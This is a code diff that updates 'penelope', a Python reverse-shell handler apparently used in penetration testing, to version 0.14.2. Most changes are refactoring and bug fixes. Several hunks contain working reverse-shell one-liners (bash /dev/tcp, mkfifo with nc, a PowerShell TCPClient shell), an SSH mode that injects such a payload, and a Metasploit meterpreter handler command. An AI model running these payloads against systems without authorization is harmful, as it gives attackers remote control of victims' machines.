@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.13.9"
+__version__ = "0.14.2"
 
 import os
 import io
@@ -50,8 +50,8 @@ from code import interact
 from zlib import compress
 from errno import EADDRINUSE, EADDRNOTAVAIL
 from select import select
-from pathlib import Path
-from argparse import ArgumentParser
+from pathlib import Path, PureWindowsPath
+from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
 from datetime import datetime
 from textwrap import indent, dedent
 from binascii import Error as binascii_error
@@ -384,12 +384,12 @@ class PBar:
 
 class paint:
 	_codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
-	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'white':231, 'orange':136}
+	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'orange':136, 'white':231, 'grey':244}
 	_escape = lambda codes: f"\001\x1b[{codes}m\002"
 
 	def __init__(self, text=None, colors=None):
 		self.text = str(text) if text is not None else None
-		self.colors = colors if colors is not None else []
+		self.colors = colors or []
 
 	def __str__(self):
 		if self.colors:
@@ -482,7 +482,7 @@ def ask(text):
 
 	except KeyboardInterrupt:
 		print("^C")
-		return ''
+		return ' '
 
 def my_input(text="", histfile=None, histlen=None, completer=lambda text, state: None, completer_delims=None):
 	if threading.current_thread().name == 'MainThread':
@@ -573,7 +573,7 @@ class BetterCMD:
 			return func(arg)
 
 	def default(self, line):
-		cmdlogger.error(f"Invalid command")
+		cmdlogger.error("Invalid command")
 
 	def interrupt(self):
 		pass
@@ -822,7 +822,7 @@ class MainMenu(BetterCMD):
 				else:
 					cmdlogger.warning(
 						f"No such command: '{command}'. "
-						f"Issue 'help' for all available commands"
+						"Issue 'help' for all available commands"
 					)
 		else:
 			for section in self.commands:
@@ -866,6 +866,8 @@ class MainMenu(BetterCMD):
 		else:
 			if core.sessions:
 				for host, sessions in core.hosts.items():
+					if not sessions:
+						continue
 					print('\n➤  ' + sessions[0].name_colored)
 					table = Table(joinchar=' | ')
 					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source')]
@@ -1032,7 +1034,7 @@ class MainMenu(BetterCMD):
 			if len(items) > options.max_open_files:
 				cmdlogger.warning(
 					f"More than {options.max_open_files} items selected"
-					f" for opening. The open list is truncated to "
+					" for opening. The open list is truncated to "
 					f"{options.max_open_files}."
 				)
 				items = items[:options.max_open_files]
@@ -1099,8 +1101,14 @@ class MainMenu(BetterCMD):
 		"""
 		[module name]
 		Run a module. Run 'help run' to view the available modules"""
-		parts = line.split(" ", 1)
-		module_name = parts[0]
+		try:
+			parts = line.split(" ", 1)
+			module_name = parts[0]
+		except:
+			module_name = None
+			print()
+			cmdlogger.warning(paint("Select a module").YELLOW_white)
+
 		if module_name:
 			module = modules().get(module_name)
 			if module:
@@ -1481,6 +1489,9 @@ class MainMenu(BetterCMD):
 	def complete_run(self, text, line, begidx, endidx):
 		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]
 
+	def complete_help(self, text, line, begidx, endidx):
+		return [command for command in self.raw_commands if command.startswith(text)]
+
 
 class ControlQueue:
 
@@ -1581,7 +1592,7 @@ class Core:
 					if command:
 						logger.debug(f"About to execute {command}")
 					else:
-						logger.debug(f"Core break")
+						logger.debug("Core break")
 					try:
 						exec(command)
 					except KeyError: # TODO
@@ -1632,11 +1643,13 @@ class Core:
 							raise OSError
 
 					except OSError:
-						logger.debug(f"Died while reading")
+						logger.debug("Died while reading")
+						if readable.OS:
+							threading.Thread(target=readable.maintain).start()
 						readable.kill()
-						threading.Thread(target=readable.maintain).start()
 						break
 
+					# TODO need thread sync
 					target = readable.shell_response_buf\
 					if not readable.subchannel.active\
 					and readable.subchannel.allow_receive_shell_data\
@@ -1685,9 +1698,10 @@ class Core:
 					try:
 						sent = writable.socket.send(writable.outbuf.getvalue())
 					except OSError:
-						logger.debug(f"Died while writing")
+						logger.debug("Died while writing")
+						if writable.OS:
+							threading.Thread(target=writable.maintain).start()
 						writable.kill()
-						threading.Thread(target=writable.maintain).start()
 						break
 
 					writable.outbuf.seek(sent)
@@ -1702,7 +1716,7 @@ class Core:
 		options.maintain = 0
 
 		if self.sessions:
-			logger.warning(f"Killing sessions...")
+			logger.warning("Killing sessions...")
 			for session in reversed(list(self.sessions.copy().values())):
 				session.kill()
 
@@ -1721,12 +1735,13 @@ class Core:
 def handle_bind_errors(func):
 	@wraps(func)
 	def wrapper(*args, **kwargs):
+		host = args[1]
+		port = args[2]
 		try:
 			func(*args, **kwargs)
 			return True
 
 		except PermissionError:
-			port = args[2]
 			logger.error(f"Cannot bind to port {port}: Insufficient privileges")
 			print(dedent(
 			f"""
@@ -1755,9 +1770,9 @@ def handle_bind_errors(func):
 
 		except OSError as e:
 			if e.errno == EADDRINUSE:
-				logger.error("The port is currently in use")
+				logger.error(f"The port '{port}' is currently in use")
 			elif e.errno == EADDRNOTAVAIL:
-				logger.error("Cannot listen on the requested address")
+				logger.error(f"Cannot listen on '{host}'")
 			else:
 				logger.error(f"OSError: {str(e)}")
 
@@ -1875,7 +1890,7 @@ class TCPListener:
 		interfaces = Interfaces().list
 		presets = [
 			"(bash >& /dev/tcp/{}/{} 0>&1) &",
-			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) &",
+			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
@@ -1915,7 +1930,7 @@ class Channel:
 	def __init__(self, raw=False, expect = []):
 		self._read, self._write = os.pipe()
 		self.can_use = True
-		self.active = False
+		self.active = True
 		self.allow_receive_shell_data = True
 		self.control = ControlQueue()
 
@@ -1943,18 +1958,6 @@ class Session:
 		self.listener = listener
 		self.source = 'reverse' if listener else 'bind'
 
-		if target == self.ip:
-			try:
-				self.hostname = socket.gethostbyaddr(target)[0]
-
-			except socket.herror:
-				self.hostname = None
-				logger.debug(f"Cannot resolve hostname")
-		else:
-			self.hostname = target
-		self.name = f"{self.hostname}~{self.ip}" if self.hostname else self.ip
-		self.name_colored = f"{paint(self.name).white_RED}"
-
 		self.id = None
 		self.OS = None
 		self.type = 'Basic'
@@ -1964,7 +1967,7 @@ class Session:
 		self.pty_ready = None
 		self.readline = None
 
-		self.version = None
+		self.win_version = None
 
 		self.prompt = None
 		self.new = True
@@ -2012,12 +2015,35 @@ class Session:
 			logger.debug(f"Echoing: {self.echoing}")
 
 			self.get_system_info()
-			self.name = f"{self.hostname}~{self.ip}_{self.system}_{self.arch}"
+
+			if not self.hostname:
+				if target == self.ip:
+					try:
+						self.hostname = socket.gethostbyaddr(target)[0]
+
+					except socket.herror:
+						self.hostname = ''
+						logger.debug("Cannot resolve hostname")
+				else:
+					self.hostname = target
+
+			hostname = self.hostname
+			c1 = '~' if hostname else ''
+			ip = self.ip
+			c2 = '-'
+			system = self.system
+			if not system:
+				system = self.OS.upper()
+			if self.arch:
+				system += '-' + self.arch
+
+			self.name = f"{hostname}{c1}{ip}{c2}{system}"
 			self.name_colored = (
-				f"{paint(self.hostname).white_BLUE}{paint('-').white_DIM}"
-				f"{paint(self.ip).white_RED}{paint('-').white_DIM}"
-				f"{paint(self.system + '-' + self.arch).cyan}"
+				f"{paint(hostname).white_BLUE}{paint(c1).white_DIM}"
+				f"{paint(ip).white_RED}{paint(c2).white_DIM}"
+				f"{paint(system).cyan}"
 			)
+
 			self.id = core.new_sessionID
 			core.hosts[self.name].append(self)
 			core.sessions[self.id] = self
@@ -2162,11 +2188,13 @@ class Session:
 		return self
 
 	def get_system_info(self):
+		self.hostname = self.system = self.arch = ''
+
 		if self.OS == 'Unix':
-			self.bypass_control_session = True
 			if not self.bin['uname']:
 				return False
 
+			self.bypass_control_session = True
 			response = self.exec(
 				r'printf "$({0} -n)\t'
 				r'$({0} -s)\t'
@@ -2174,15 +2202,25 @@ class Session:
 				agent_typing=True,
 				value=True
 			)
-			self.hostname, self.system, self.arch = response.split("\t")
 			self.bypass_control_session = False
+
+			try:
+				self.hostname, self.system, self.arch = response.split("\t")
+			except:
+				return False
 
 		elif self.OS == 'Windows':
 			self.systeminfo = self.exec('systeminfo', value=True)
+			if not self.systeminfo:
+				return False
+
+			if (not "\n" in self.systeminfo) and ("OS Name" in self.systeminfo): #TODO TEMP PATCH
+				self.exec("cd", force_cmd=True, raw=True)
+				return False
 
 			def extract_value(pattern):
 				match = re.search(pattern, self.systeminfo, re.MULTILINE)
-				return match.group(1).replace(" ", "_").rstrip() if match else None
+				return match.group(1).replace(" ", "_").rstrip() if match else ''
 
 			self.hostname = extract_value(r"^Host Name:\s+(.+)")
 			self.system = extract_value(r"^OS Name:\s+(.+)")
@@ -2219,7 +2257,7 @@ class Session:
 				return None # TODO
 			response = self.exec("whoami", value=True)
 
-		return response
+		return response or ''
 
 	def get_tty(self, silent=False):
 		response = self.exec("tty", agent_typing=True, value=True) # TODO check binary
@@ -2288,7 +2326,7 @@ class Session:
 	def tmp(self):
 		if self._tmp is None:
 			if self.OS == "Unix":
-				logger.debug(f"Trying to find a writable directory on target")
+				logger.debug("Trying to find a writable directory on target")
 				tmpname = rand(10)
 				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
 				for directory in common_dirs:
@@ -2302,7 +2340,7 @@ class Session:
 						self._tmp = directory
 						break
 				else:
-					candidate_dirs = self.exec(f'find / -type d -writable 2>/dev/null')
+					candidate_dirs = self.exec("find / -type d -writable 2>/dev/null")
 					if candidate_dirs:
 						for directory in candidate_dirs.decode().splitlines():
 							if directory in common_dirs:
@@ -2385,44 +2423,60 @@ class Session:
 				data = data.decode()
 			except:
 				return False
+
 			if var_value1 + var_value2 in data:
 				return True
+
 			elif f"'{var_name1}' is not recognized as an internal or external command" in data:
-				return re.search('batch file.*>', data, re.DOTALL)
+				return re.search('batch file.\r\n', data, re.DOTALL)
+			elif re.search('PS.*>', data, re.DOTALL):
+				return True
+
 			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
 				return re.search('or operable.*>', data, re.DOTALL)
+			elif re.search('Microsoft Windows.*>', data, re.DOTALL):
+				return True
 
 		response = self.exec(
 			f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n",
 			raw=True,
 			expect_func=expect
 		)
+
 		if response:
 			response = response.decode()
 
 			if var_value1 + var_value2 in response:
 				self.OS = 'Unix'
-				self.interactive = not response == var_value1 + var_value2 + "\n"
+				self.prompt = re.search(f"{var_value1}{var_value2}\n(.*)", response, re.DOTALL)
+				if self.prompt:
+					self.prompt = self.prompt.group(1).encode()
+				self.interactive = bool(self.prompt)
 				self.echoing = f"echo ${var_name1}${var_name2}" in response
-				self.prompt = response.split(var_value1 + var_value2)[-1].lstrip().encode()
 
-			elif f"'{var_name1}' is not recognized as an internal or external command" in response:
+			elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
+					re.search('Microsoft Windows.*>', response, re.DOTALL):
 				self.OS = 'Windows'
 				self.type = 'Basic'
 				self.subtype = 'cmd'
 				self.interactive = True
 				self.echoing = True
-				self.prompt = response.splitlines()[-1].encode()
-				self.version = re.search(rf"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)[1]
+				prompt = re.search(r"\r\n\r\n([a-zA-Z]:\\.*>)", response, re.MULTILINE)
+				self.prompt = prompt[1].encode() if prompt else b""
+				win_version = re.search(r"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)
+				if win_version:
+					self.win_version = win_version[1]
 
-			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response:
+			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
+					re.search('PS.*>', response, re.DOTALL):
 				self.OS = 'Windows'
 				self.type = 'Basic'
 				self.subtype = 'psh'
 				self.interactive = True
 				self.echoing = False
 				self.prompt = response.splitlines()[-1].encode()
-		else:
+
+		else: #TODO check if it is needed
 			def expect(data):
 				try:
 					data = data.decode()
@@ -2444,7 +2498,7 @@ class Session:
 				self.OS = 'Windows'
 				self.type = 'Basic'
 				self.subtype = 'psh'
-				self.interactive = True
+				self.interactive = not var_value1 + var_value2 == response
 				self.echoing = False
 				self.prompt = response.splitlines()[-1].encode()
 				if var_name1 in response and not f"echo ${var_name1}${var_name2}" in response:
@@ -2452,9 +2506,9 @@ class Session:
 					columns, lines = shutil.get_terminal_size()
 					cmd = (
 						f"$width={columns}; $height={lines}; "
-						f"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
-						f"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
-						f"-ArgumentList ($width, $height)"
+						"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
+						"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
+						"-ArgumentList ($width, $height)"
 					)
 					self.exec(cmd)
 					self.prompt = response.splitlines()[-2].encode()
@@ -2628,8 +2682,12 @@ class Session:
 			if self.need_control_session and not self.bypass_control_session:
 				args = locals()
 				del args['self']
-				response = self.control_session.exec(**args)
-				return response
+				try:
+					response = self.control_session.exec(**args)
+					return response
+				except AttributeError: # No control session
+					logger.error("Spawn MANUALLY a new shell for this session to operate properly")
+					return None
 
 			if not self or not self.subchannel.can_use:
 				logger.debug("Exec: The session is killed")
@@ -2653,7 +2711,8 @@ class Session:
 						cmd = b' ' + cmd + b'\n'
 
 					elif self.OS == 'Windows':
-						cmd = cmd + b'\r\n' # TODO SOS echoed_cmd_regex check
+						cmd = cmd + b'\r\n'
+						echoed_cmd_regex = re.escape(cmd)
 				else:
 					token = [rand(10) for _ in range(4)]
 
@@ -2759,7 +2818,7 @@ class Session:
 
 					elif expect_func:
 						if expect_func(buffer.getvalue()):
-							logger.debug(paint(f"The expected strings found in data").yellow)
+							logger.debug(paint("The expected strings found in data").yellow)
 							self.subchannel.result = buffer.getvalue()
 						else:
 							logger.debug(paint('No expected strings found in data. Receive again...').yellow)
@@ -2791,7 +2850,7 @@ class Session:
 			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
 			f"\n  2) Upload local {name} binary"
 			f"\n  3) Specify remote {name} binary path"
-			f"\n  4) None of the above\n"
+			 "\n  4) None of the above\n"
 		)
 		print(paint(options).magenta)
 		answer = ask("Select action: ")
@@ -2799,7 +2858,7 @@ class Session:
 		if answer == "1":
 			return self.upload(
 				url,
-				remote_path=self.tmp,
+				remote_path="/var/tmp",
 				randomize_fname=False
 			)[0]
 
@@ -2883,7 +2942,7 @@ class Session:
 					cmd = socat_cmd.format(_bin)
 
 				else:
-					_bin = self.tmp + '/socat'
+					_bin = "/var/tmp/socat"
 					if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
 						cmd = socat_cmd.format(_bin)
 					else:
@@ -2972,7 +3031,7 @@ class Session:
 			else: # TODO
 				threading.Thread(
 					target=self.exec,
-					args=(f"stty rows {lines} columns {columns} -F {self.tty}",),
+					args=(f"stty rows {lines} columns {columns} < {self.tty}",),
 					name="RESIZE"
 				).start() #TEMP
 		elif self.OS == 'Windows': # TODO
@@ -3068,6 +3127,7 @@ class Session:
 		if core.attached_session is None:
 			return False
 
+		core.wait_input = False
 		core.attached_session = None
 		core.rlist.remove(sys.stdin)
 
@@ -3200,16 +3260,17 @@ class Session:
 
 				tar_source, mode = stdout_stream, "r|gz"
 			else:
+				remote_items = ' '.join([os.path.join(self.cwd, part) for part in shlex.split(remote_items)])
 				temp = self.tmp + "/" + rand(8)
-				cmd = rf'for file in {remote_items}; do tar -C "$(dirname "$file")" -czf - "$(basename "$file")"; done | base64 > {temp} && echo ok'
+				cmd = rf'tar -czf - -h {remote_items}|base64|tr -d "\n" > {temp}'
 				response = self.exec(cmd, timeout=None, value=True)
-				if not response or response != "ok":
+				if response is False:
 					logger.error("Cannot create archive")
 					return []
 				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
 				for error in errors:
 					logger.error(error)
-				send_size = int(self.exec(rf"stat {temp} | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))
+				send_size = int(self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))
 
 				b64data = io.BytesIO()
 				for offset in range(0, send_size, options.download_chunk_size):
@@ -3603,16 +3664,17 @@ class Session:
 				return []
 
 		# Present uploads
-		sep = '/' if self.OS == 'Unix' else '\\'
-		base = destination.rstrip(sep)
-		altnames = [base + sep + x for x in altnames]
-
+		uploaded_paths = []
 		for item in altnames:
-			uploaded_path = shlex.quote(str(item)) if self.OS == 'Unix' else f'"{item}"'
+			if self.OS == "Unix":
+				uploaded_path = shlex.quote(str(Path(destination) / item))
+			elif self.OS == "Windows":
+				uploaded_path = f'"{PureWindowsPath(destination, item)}"'
 			logger.info(f"{paint('Upload OK').GREEN_white} {paint(uploaded_path).yellow}")
+			uploaded_paths.append(uploaded_path)
 			print()
 
-		return altnames
+		return uploaded_paths
 
 	@agent_only
 	def script(self, local_script):
@@ -3682,9 +3744,9 @@ class Session:
 					new_listener = TCPListener(host, port)
 
 				if self.bin['bash']:
-					cmd = f'printf "{self.bin["setsid"]} {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"|{self.bin["bash"]}'
-				elif self.bin['nc']:
-					cmd = f'sh -c \'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | {self.bin["sh"]} 2>&1 | nc {host} {port} > /tmp/f &\''
+					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
+				elif self.bin['nc'] and self.bin['sh']:
+					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
 				elif self.bin['sh']:
 					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
 					ncat_binary = self.tmp + '/ncat'
@@ -3832,13 +3894,16 @@ class Session:
 
 	def kill(self):
 
-		if self not in core.rlist:
+		if self not in core.rlist: # TODO check if it is needed
 			return True
+
+		if menu.sid == self.id:
+			menu.set_id(None)
 
 		thread_name = threading.current_thread().name
 		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")
 
-		if thread_name != 'Core':
+		if self.OS and thread_name != 'Core':
 			if self.need_control_sessions and\
 				not self.spare_control_sessions and\
 				self.control_session is self:
@@ -3856,9 +3921,6 @@ class Session:
 					module.run(self)
 
 			core.control << f'self.sessions[{self.id}].kill()'
-
-			if menu.sid == self.id:
-				menu.set_id(None)
 
 			self.maintain()
 			return
@@ -3879,7 +3941,7 @@ class Session:
 		self.socket.close()
 
 		if not self.OS:
-			message = f"Invalid shell from {self.name_colored} 🙄"
+			message = f"Invalid shell from {self.ip} 🙄"
 		else:
 			del core.sessions[self.id]
 			core.hosts[self.name].remove(self)
@@ -3887,6 +3949,7 @@ class Session:
 
 			if not core.hosts[self.name]:
 				message += f" We lost {self.name_colored} 💔"
+				del core.hosts[self.name]
 
 		logger.error(message)
 
@@ -4184,7 +4247,8 @@ def agent():
 									except:
 										pass
 
-									del streams[stdin_stream_id]
+									#if stdin_stream_id in streams:
+									#	del streams[stdin_stream_id]
 									stdout_stream << "".encode()
 									stderr_stream << "".encode()
 								threading.Thread(target=run, args=(stdin_stream, stdout_stream, stderr_stream)).start()
@@ -4327,7 +4391,13 @@ class peass_ng(Module):
 
 		elif session.OS == 'Windows':
 			logger.error("This module runs only on Unix shells")
-
+			while True:
+				answer = ask(f"Use {paint('upload_privesc_scripts').GREY_white}{paint(' instead? (Y/n): ').yellow}").lower()
+				if answer in ('y', ''):
+					menu.do_run('upload_privesc_scripts')
+					break
+				elif answer == 'n':
+					break
 
 class lse(Module):
 	category = "Privilege Escalation"
@@ -4372,8 +4442,8 @@ class meterpreter(Module):
 				uploaded_path = session.upload(payload_path)
 				if uploaded_path:
 					meterpreter_handler_cmd = (
-						f'msfconsole -x "use exploit/multi/handler; '
-						f'set payload windows/meterpreter/reverse_tcp; '
+						'msfconsole -x "use exploit/multi/handler; '
+						'set payload windows/meterpreter/reverse_tcp; '
 						f'set LHOST {host}; set LPORT {port}; run"'
 					)
 					Open(meterpreter_handler_cmd, terminal=True)
@@ -4782,8 +4852,9 @@ class Options:
 	def __init__(self):
 		self.basedir = Path.home() / f'.{__program__}'
 		self.default_listener_port = 4444
-		self.default_interface = "0.0.0.0"
+		self.default_bindshell_port = 5555
 		self.default_fileserver_port = 8000
+		self.default_interface = "0.0.0.0"
 		self.payloads = False
 		self.no_log = False
 		self.no_timestamps = False
@@ -4834,14 +4905,14 @@ class Options:
 				value = self.max_maintain
 			if value < 1:
 				value = 1
-			#if value == 1: show(f"Maintain value should be 2 or above")
+			#if value == 1: show("Maintain value should be 2 or above")
 			if value > 1 and self.single_session:
-				show(f"Single Session mode disabled because Maintain is enabled")
+				show("Single Session mode disabled because Maintain is enabled")
 				self.single_session = False
 
 		elif option == 'single_session':
 			if self.maintain > 1 and value:
-				show(f"Single Session mode disabled because Maintain is enabled")
+				show("Single Session mode disabled because Maintain is enabled")
 				value = False
 
 		elif option == 'no_bins':
@@ -4874,9 +4945,12 @@ class Options:
 def main():
 
 	## Command line options
-	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False)
+	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False,
+		formatter_class=lambda prog: ArgumentDefaultsHelpFormatter(prog, width=150, max_help_position=40))
 
-	parser.add_argument("ports", nargs='*', help="Ports to listen/connect to, depending on -i/-c options. Default: 4444")
+	parser.add_argument("-p", "--port", help=f"Port to listen/connect/serve, depending on -i/-c/-s options. \
+		Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port}")
+	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell")
 
 	method = parser.add_argument_group("Reverse or Bind shell?")
 	method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
@@ -4901,7 +4975,6 @@ def main():
 
 	misc = parser.add_argument_group("File server")
 	misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
-	misc.add_argument("-p", "--port", help="File Server port. Default: 8000", metavar='')
 	misc.add_argument("-prefix", "--url-prefix", help="URL prefix", type=str, metavar='')
 
 	debug = parser.add_argument_group("Debug")
@@ -4927,52 +5000,63 @@ def main():
 	# Show Version
 	if options.version:
 		print(__version__)
-		sys.exit()
 
 	# Show Interfaces
 	elif options.interfaces:
 		print(Interfaces())
-		sys.exit()
 
 	# Check hardcoded URLs
 	elif options.check_urls:
 		signal.signal(signal.SIGINT, signal.SIG_DFL)
 		check_urls()
-		sys.exit()
 
 	# Main Menu
 	elif options.menu:
 		signal.signal(signal.SIGINT, keyboard_interrupt)
 		menu.show()
 		menu.start()
-		sys.exit()
 
 	# File Server
 	elif options.serve:
-		server = FileServer(*options.ports or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
+		server = FileServer(*options.args or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
 		if server.filemap:
 			server.start()
 		else:
 			logger.error("No files to serve")
-		sys.exit()
 
-	if not options.ports:
-		options.ports.append(options.default_listener_port)
+	# Reverse shell via SSH
+	elif options.args and options.args[0] == "ssh":
+		if len(options.args) > 1:
+			TCPListener(host=options.interface, port=options.port)
+			options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={options.port or options.default_listener_port};"
+				f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
+				f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
+			)
+		try:
+			if subprocess.run(options.args).returncode == 0:
+				logger.info("SSH command executed!")
+				menu.start()
+			else:
+				core.stop()
+				sys.exit(1)
+		except Exception as e:
+			logger.error(e)
 
-	for port in options.ports:
-		# Bind shell
-		if options.connect:
-			if not Connect(options.connect, port):
-				sys.exit(1)
-		# Reverse Listener
-		else:
-			TCPListener(host=options.interface, port=port)
-			if not core.listeners:
-				sys.exit(1)
-	listener_menu()
-	signal.signal(signal.SIGINT, keyboard_interrupt)
-	menu.start()
-	sys.exit()
+	# Bind shell
+	elif options.connect:
+		if not Connect(options.connect, options.port or options.default_bindshell_port):
+			sys.exit(1)
+		menu.start()
+
+	# Reverse Listener
+	else:
+		TCPListener(host=options.interface, port=options.port)
+		if not core.listeners:
+			sys.exit(1)
+
+		listener_menu()
+		signal.signal(signal.SIGINT, keyboard_interrupt)
+		menu.start()
 
 #################### PROGRAM LOGIC ####################
 
